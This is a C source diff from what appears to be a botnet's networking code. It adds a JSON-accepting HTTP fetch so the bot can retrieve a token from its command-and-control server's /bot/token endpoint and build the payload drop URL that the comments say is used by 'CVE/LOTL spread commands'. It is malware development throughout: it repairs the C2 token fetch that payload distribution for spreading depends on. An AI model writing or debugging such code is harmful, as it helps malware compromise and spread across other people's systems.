@@ -1170,7 +1170,8 @@ static int http_json_ack_detected(const char *what, const char *headers,
  * target any host, which is what dead-drop resolution needs. Cleartext only —
  * the default build has no TLS — so callers must NOT treat the transport as a
  * trust boundary; verification must happen on the payload (see deaddrop.c). */
-int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
+static int http_get_url_impl(notnet_bot_t *bot, const char *url, char *buf,
+                             int len, int allow_json) {
     if (!url || url[0] == '\0' ||
         (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0)) {
         log_warn("HTTP: http_get_url requires an http:// or https:// URL");
@@ -1261,8 +1262,10 @@ int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
 
     /* #195: JSON ack where a binary blob was expected — the C2 rejected
      * us or the peer predates the #173 wire contract. Log it loudly and
-     * fail instead of handing the caller an ack masquerading as a blob. */
-    {
+     * fail instead of handing the caller an ack masquerading as a blob.
+     * Skipped when the caller expects JSON (the /bot/token fetch, whose
+     * SUCCESS reply is a JSON token object). */
+    if (!allow_json) {
         char *hdr_end = strstr(buf, "\r\n\r\n");
         if (hdr_end) {
             size_t hlen = (size_t)(hdr_end - buf);
@@ -1274,6 +1277,14 @@ int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
         }
     }
     return total;
+}
+
+int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
+    return http_get_url_impl(bot, url, buf, len, 0);
+}
+
+int http_get_url_json(notnet_bot_t *bot, const char *url, char *buf, int len) {
+    return http_get_url_impl(bot, url, buf, len, 1);
 }
 
 /* #190: build the payload drop URL used by CVE/LOTL spread commands.
@@ -1305,7 +1316,10 @@ int build_drop_url(notnet_bot_t *bot, char *dl_url, size_t sz) {
                  bot->c2_http.server, PAYLOAD_DL_PORT) < 0)
         goto fallback;
     char resp[1024];
-    if (http_get_url(bot, tok_url, resp, sizeof(resp)) > 0) {
+    /* #395: the token endpoint's SUCCESS reply is a JSON object — use the
+     * JSON-accepting fetch variant or #195's binary-blob guard rejects it
+     * and every drop fails closed. */
+    if (http_get_url_json(bot, tok_url, resp, sizeof(resp)) > 0) {
         const char *body = strstr(resp, "\r\n\r\n");
         char tok[128];
         if (body && json_find_string(body + 4, "token", tok, sizeof(tok)) &&
